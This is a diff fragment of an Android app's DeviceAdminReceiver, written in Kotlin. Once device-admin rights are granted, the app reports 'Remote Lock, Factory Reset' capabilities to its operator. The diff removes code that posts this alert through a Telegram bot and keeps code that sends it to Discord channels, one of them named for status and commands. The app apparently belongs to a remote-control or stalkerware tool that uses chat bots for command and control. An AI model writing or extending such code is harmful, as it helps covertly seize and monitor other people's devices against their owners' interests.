@@ -59,24 +59,7 @@ class AppDeviceAdminReceiver : DeviceAdminReceiver() {
                         "• **Timestamp**: `$timeStr`\n" +
                         "• **Capabilities**: Remote Lock, Factory Reset, Enterprise Permission Control Unlocked!"
 
-                // 1. Send to Telegram
-                val tgPrefs = context.getSharedPreferences("app_prefs", Context.MODE_PRIVATE)
-                val tgToken = tgPrefs.getString("bot_token", "") ?: ""
-                val tgChatId = tgPrefs.getString("chat_id", "") ?: ""
-
-                if (tgToken.isNotBlank() && tgChatId.isNotBlank()) {
-                    val url = "https://api.telegram.org/bot$tgToken/sendMessage"
-                    val json = JSONObject().apply {
-                        put("chat_id", tgChatId)
-                        put("text", alertText)
-                        put("parse_mode", "Markdown")
-                    }
-                    val body = json.toString().toRequestBody("application/json".toMediaTypeOrNull())
-                    val req = Request.Builder().url(url).post(body).build()
-                    try { httpClient.newCall(req).execute().close() } catch (_: Exception) {}
-                }
-
-                // 2. Send to Discord #02-status-alerts / #01-status-and-commands channel
+                // Send to Discord #02-status-alerts / #01-status-and-commands channel
                 val dcPrefs = context.getSharedPreferences("discord_channels", Context.MODE_PRIVATE)
                 val dcToken = dcPrefs.getString("discord_bot_token", "") ?: ""
                 val dcChanId = dcPrefs.getString("chan_02-status-alerts", null)
